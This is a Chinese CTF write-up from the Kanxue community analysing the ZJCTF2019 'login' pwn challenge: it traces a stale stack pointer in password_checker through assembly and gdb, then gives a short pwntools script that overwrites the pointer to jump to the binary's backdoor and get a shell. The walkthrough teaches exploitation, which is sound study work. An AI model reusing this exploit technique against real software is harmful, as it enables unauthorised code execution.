---
title: pwn题ZJCTF2019 login的分析
url: https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458490684&idx=1&sn=9419d6bdf08c3fb7e97c39e80ea83b28&chksm=b18ea7b686f92ea09c4b4c21166b2a3901d5f68a986119e3e43eb850c6e9ee3bcbccf7958351&scene=58&subscene=0#rd
source: 看雪学院
date: 2023-01-05
fetch_date: 2025-10-04T03:05:06.782665
---

# pwn题ZJCTF2019 login的分析

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8Eqic51RIXYMYyr8uCAmQoDuQbMoHicIBgI1FEohkL9NyXIfkWc2wuuMBXiciaI9tNwc591J77Zpu2AYA/0?wx_fmt=jpeg)

# pwn题ZJCTF2019 login的分析

N1co5in3

看雪学苑

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8Eqic51RIXYMYyr8uCAmQoDuxXsUScVwWZORR8mhyGaDmP4W7eEheBrCul2bJzOsFUOiaD8GoNJOQMQ/640?wx_fmt=jpeg)

本文为看雪论坛优秀文章

看雪论坛作者ID：N1co5in3

由于对汇编了解甚少，本不复杂的一题让我学到了很多。

##

##

## **题目复现**

文件一开始需要登录，需要用户名和密码。
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8Eqic51RIXYMYyr8uCAmQoDuYgN5oZLVDKGUHQFdDQCEXwdBZ0MlvYdQJLWOVzFUfFVfrP3YkqPRSw/640?wx_fmt=png)

Admin结构体与User的区别在于指针改为了0x401150，但还是get\_password指针。

感觉这个Admin结构体意义不明，但数据结构的构思和我们关系不大就是了
后续可能存在函数指针的利用。
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8Eqic51RIXYMYyr8uCAmQoDutKm1zMzuvkw2PsnaCJwzWdXxVwUxROz46FFujficibT1KXV84BkVvgbA/640?wx_fmt=png)
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8Eqic51RIXYMYyr8uCAmQoDuKHv3N1ibmiaCaB24E1P6VHN9JEwC4Rib9xpgJj6GcKia017eIQrv7pnwdQ/640?wx_fmt=png)
接着看主函数25行的User::read\_name，读取输入的0x49个字符，然后赋值给bss段的login+1处，login是一个全局User结构体，实现了名字读入。
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8Eqic51RIXYMYyr8uCAmQoDuu14P8xSy448f6icEHMQMRaqlEsTwss8B2VM9gEqpej9zcBticgt5251A/640?wx_fmt=png)
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8Eqic51RIXYMYyr8uCAmQoDueo8lzABnU8VlulTuUicTlG01vNX8y3icXTdjP9KYw4WUhzGsG3S6LKXQ/640?wx_fmt=png)
接着到了本题的重点，指针v3(实际只被寄存器暂存)存储函数指针main::{lambda(void)#1}::operator,然后经过password\_checker得到二级指针v7。
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8Eqic51RIXYMYyr8uCAmQoDuvmJBneeNaZFWHJOSgxNkDge5fHg2DZtYibePLEJfOlpY3Xcw9H9GY1Q/640?wx_fmt=png)
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8Eqic51RIXYMYyr8uCAmQoDu8SCaP2icyML7xRomRYsK0155zHibkiaPBSbuiba1I49AleEP44icicjy6Jibw/640?wx_fmt=png)
查看password\_checker,3\*8的数组v2中，在v2处存储了a1(主函数的v3）指针。
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8Eqic51RIXYMYyr8uCAmQoDuUicC1Gx4L8ykzfl5mQ0lqpnIVR5O8Q0TVibBWYdEmdbT8j10jF5AF8vg/640?wx_fmt=png)
看汇编语言更为直观，rax存储了[rbp-0x18]处的地址。
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8Eqic51RIXYMYyr8uCAmQoDuTlHvW2fL7ywdBT7P47uXvNWsLOGKdO4zA8XnY23RQicFhrSj7yptPaw/640?wx_fmt=png)
接着是read\_password函数，与read\_name函数基本一致。
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8Eqic51RIXYMYyr8uCAmQoDu8dSV7UwpMu8icAXmOPtHI1HLL6QGiapfQgxKtYUWNZJXSm5Q2B41Cib6g/640?wx_fmt=png)
get\_password函数很简单。
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8Eqic51RIXYMYyr8uCAmQoDuwM1jt7JicvIhMoFPODvA4rjaKrQXn63hGT83kFiayvql99wHIyBU8JWw/640?wx_fmt=png)
在看最后的password\_checker()前，我们用正确密码测试文件，显示段错误。
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8Eqic51RIXYMYyr8uCAmQoDuGSmLyDLlhtBCwia56gp0ZXYSOjwqib2kAxZMKrduLxOa9Z6HvTc3hicuA/640?wx_fmt=png)
查看password\_checker,login与admin的密码比较后，来了个奇葩的有毒打印，接着前面的二级函数终于被调用了。
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8Eqic51RIXYMYyr8uCAmQoDuWCBhofBOIxDYaprxdlGkIYkD49v6ibA28hoT3SCRN65fiaOm7Lark5XQ/640?wx_fmt=png)
我们需要知道报错原因，gdb调试发现正好是二级指针调用出错。
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8Eqic51RIXYMYyr8uCAmQoDuWYfn69hMrg7oZf1zf1cg6oeZhqNH0mz3z00MltITap566fUiahY0xEA/640?wx_fmt=png)
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8Eqic51RIXYMYyr8uCAmQoDudHpbYibicTgrWJUQzomm6uibiaHS6d9DN3HbVlO3I4GsTygniaiaq18jJgIw/640?wx_fmt=png)
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8Eqic51RIXYMYyr8uCAmQoDuf9aIiaiaggYZeNiaDLZricABX2nibRqve4f1jKzr9S1u5ic2icN5wHYvm0Gwg/640?wx_fmt=png)
此外题目中有现成后门。
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8Eqic51RIXYMYyr8uCAmQoDu4hfecXFiaW28Jc6boPhcZDBXFK3swPBoVcciaCmiacNEgEpAeAzQZPIuQ/640?wx_fmt=png)
因此这题的漏洞基本算是送到脸上了，但对汇编不了解的我硬是做了两天。

##

##

## **利用思路**

经过上面的初步分析，我们知道程序在password\_checker中调用一个二级指针失败而段错误终止，考虑到canary的存在，srop不可能短期实现。即使我们无法利用这个二级指针getshell，它的存在也会让程序终止。由于存在后门函数，只要能改变这个二级指针，这题就getshell了。

##

##

## **调试过程**

在网上多位师傅博客的参考下，我学会了用汇编溯源的技巧。c语言代码虽然易懂，但最硬核与直接的还是汇编。

调试前我们要明白一个概念：对于一个函数内调用的函数，他们的栈是平行的：由于push rbp; mov rbp, rsp;sub rsp, x子函数的ebp相同，esp根据位移不同而不同。

因此，子函数的栈空间会存在反复利用的情况；如果父函数中出现了子函数栈空间的指针变量，下一次调用子函数时，这个指针变量指向的值就有可能改变！

回到调试，我们观察main函数的汇编，指针存于[rbp-0x130]，它来自于password\_checker的rax。
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8Eqic51RIXYMYyr8uCAmQoDucBF3M75UYLdzzC2icazJzHhR9E6iaAwOmyCibianXL9TWib6ia1sE9pUT8sw/640?wx_fmt=png)
此处与我们初步调试的结果相同，rax的来源是[rbp-0x18]的地址（我原来不明白lea的意思……想了很久）。在最终二级指针调用时，会获得rbp-0x18的值，再获得[rbp-0x18]内的地址。我们可以覆盖后面子函数中[rbp-0x18]的值。
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8Eqic51RIXYMYyr8uCAmQoDuBroGOB1vs3Hud2j9IaIlDZKUgqbC7LXc7OxCjp0dWo8FCCrrtzVCpw/640?wx_fmt=png)

##

##

## **payload**

```
from pwn import *context.log_level = 'debug' io = process('./login')#io = remote('node4.buuoj.cn',25895)#pause()#gdb.attach(io, 'b *0x400b42') io.sendlineafter('username: ', 'admin')payload = b'2jctf_pa5sw0rd\x00'.ljust(0x48, b'\x61') + p64(0x400e88)io.sendafter('password', payload)io.interactive()
```

##

##

## **总结**

##

## 1、通过本题，熟悉了ida中根据汇编进行调试的过程，不再局限于c语言代码获取信息。

##

## 2、对二级指针，函数传参选择地址还是数据的理解加深。

##

## 3、若测试题目时出现段错误，务必追踪段错误的原因，很可能就是解题关键。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8Eqic51RIXYMYyr8uCAmQoDuCwnD3FnlR8rXCf5PiaPicywUadjBDiaIFozN52jW1pribsqzYdqZIwLJqg/640?wx_fmt=png)

**看雪ID：N1co5in3**

https://bbs.pediy.com/user-home-945391.htm

\*本文由看雪论坛 N1co5in3 原创，转载请注明来自看雪社区

[![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8FJVH3PGSiaY563SLhIPrI0tKsReH9ARfAoZb9ibj7MGPKOXiceialNsOGKPTYRKxcFMlibNjcdZml6dmw/640?wx_fmt=jpeg)](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458487503&idx=3&sn=2961e0a289c1e755b2fc5b0403f73f8d&chksm=b18eba4586f933536298c08c8e5a4d5e0f8c65ec5f431adfd62de8881bcb6c8d4bfabfa7adc4&scene=21#wechat_redirect)

**#****往期推荐**

1.[CVE-2022-21882提权漏洞学习笔记](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458471430&idx=1&sn=6a47d0c5c8f3f6204548e80977ecd059&chksm=b18e7c8c86f9f59a88d9b8e83c8297e0ef65034a73436998ab835531baadaa51f3d630793b95&scene=21#wechat_redirect)

2.[wibu证书 - 初探](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458471429&idx=1&sn=a85188de9b9697fd1b9e708bb8bb1fdb&chksm=b18e7c8f86f9f59933d6cbf0040ed796f06e37b23f17f1ae842eb22257de02338e1a8d751f6b&scene=21#wechat_redirect)

3.[win10 1909逆向之APIC中断和实验](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458471421&idx=2&sn=e83cf7220dc1c4c06a2efc78593e30cc&chksm=b18e7b7786f9f2614ecce34e23be7f71a3d3516766aabda8f25ae41c81ef359a2c245503cf86&scene=21#wechat_redirect)

4.[EMET下EAF机制分析以及模拟实现](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458468723&idx=2&sn=5a830d04185d80e1b6cfa639dc6c6c15&chksm=b18e71f986f9f8ef5b3c2fec51f69751e63a5d6bdbadf43b49728ba05606fc4ac63fda378c92&scene=21#wechat_redirect)

5.[sql注入学习分享](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458468108&idx=1&sn=42c8ec155e13e3882cf4aeb60cdbb982&chksm=b18e0f8686f98690c9792298abb04dd243862ff8effd545dc668c7b1c682aaacf9797d899e97&scene=21#wechat_redirect)

6.[V8 Array.prototype.concat函数出现过的issues和他们的POC们](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458468074&idx=2&sn=06eb27c1649bd4e3a3e43a46a9500add&chksm=b18e0e6086f9877644ba0de33658232f99213d1b1b074342260031cb529c1b7ad1b89b2e0204&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_jpg/Uia4617poZXP96fGaMPXib13V1bJ52yHq9ycD9Zv3WhiaRb2rKV6wghrNa4VyFR2wibBVNfZt3M5IuUiauQGHvxhQrA/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8EbEJaHl4j4oA4ejnuzPAicdP7bNEwt8Ew5l2fRJxWETW07MNo7TW5xnw60R9WSwicicxtkCEFicpAlQg/640?wx_fmt=gif)

**球分享**

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8EbEJaHl4j4oA4ejnuzPAicdP7bNEwt8Ew5l2fRJxWETW07MNo7TW5xnw60R9WSwicicxtkCEFicpAlQg/640?wx_fmt=gif)

**球点赞**

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8EbEJaHl4j4oA4ejnuzPAicdP7bNEwt8Ew5l2fRJxWETW07MNo7TW5xnw60R9WSwicicxtkCEFicpAlQg/640?wx_fmt=gif)

**球在看**

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8EbEJaHl4j4oA4ejnuzPAicd7icG69uHMQX9DaOnSPpTgamYf9cLw1XbJLEGr5Eic62BdV6TRKCjWVSQ/640?wx_fmt=gif)

点击“阅读原文”，了解更多！

预览时标签不可点

阅读原文

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/1UG7KPNHN8EGLfh77kFmnicd9WOic2ibvhCibFdB4bL4srJCgo2wnvdoXLxpIvAkfCmmcptXZB0qKWMoIP8iaibYN2FA/0?wx_fmt=png)

看雪学苑

向上滑动看下一个

知道了

![]()
微信扫一扫
使用...